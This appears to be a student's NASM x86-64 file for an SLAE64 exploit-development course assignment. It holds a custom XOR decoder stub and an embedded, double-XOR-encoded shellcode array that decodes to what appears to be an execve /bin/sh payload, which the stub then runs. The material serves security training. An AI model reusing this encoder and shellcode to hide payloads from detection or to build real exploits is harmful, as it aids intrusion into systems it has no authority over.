; File: xor-decoder-maker.nasm
; Author: Kevin Ren, originally professor viviek of SLAE
; Purpose: to demostrate decoding of xor ecoded shellcode and 
; 		execute without hardcode length by using a marker

; NOTE: we will use the JMP CALL POP Technique to manipulate and decode our encoded shellcode
; NOTE: this method will result in seg fault if compiled and ran without a shellcode skeleton, because we are overwritting text section

; SLAE64 assignment 4 custom encoder:
; 					used the same xor encoder, but xored it again with another byte
;					thus to decode, we just need to xor it one more time than what we did before
;					like xor the additional byte first (0xBB), then xor against 0xAA
;					remember our marker is now 0xbb, we need to check first before xor again with 0xaa
;					this way we can jmp to decoded shellcode as soon as we are at our marker
;					if we compare after, the xor operation with 0xaa will effect our zero flag 
; 					and we wont be able to jmp to shellcode properly because of that, resulting in segfault
;					b/c we kept on xoring the bytes after our shellcode was done, aka 00 bytes
;

; 	ENCODER:
;	Original shellcode  ^ 0xAA = first xor shellcode
;	first xor shellcode ^ 0xBB = second xor shellcode

; 	DECODER:
;	second xor shellcode ^ 0xBB = first xor shellcode
;	first xor shellcode  ^ 0xAA = original shellcode

;	MARKER: (remember: Marker needs to be at the end of the encoded shellcode inside the decoder)
;			* just rememeber there is no 0xBB byte within the encoded shellcode, other than the last one
;	0xBB

global _start

section .text


_start:
	jmp decoder
	shellcode: db 0x59,0x20,0xd1,0x59,0x20,0xca,0xa1,0x2a,0x42,0x59,0xa8,0x3e,0x73,0x78,0x7f,0x3e,0x3e,0x62,0x79,0x40,0x59,0x98,0xf6,0x42,0x46,0x59,0x98,0xf7,0x42,0x59,0x98,0xf3,0x1e,0x14,0xbb			; 0xbb is our last marker because its the string we XORed against during encoding, and will result in zero

decoder:
	lea rsi, [rel shellcode]	; rsi has the address that points to Shellcode (encoded), using relative rip addressing
decode:
	xor byte [rsi], 0xBB		; added decode
					; we compare this first because the marker is 0xbb, and will set zero flag once xor is complete at the end
					; if we are not at maker, we shall xor again with original 0xaa to get original byte in [esi]
	jz shellcode			; if XORing results in 0, as with marker, ZF will set and this will transfer control to Shellcode
	xor byte [rsi], 0xAA		; XORing the first byte of what is stored at ESI address
	inc rsi				; if not at marker yet, we will increment esi by a byte
	jmp short decode		; and unconditionally jump to Decode label again


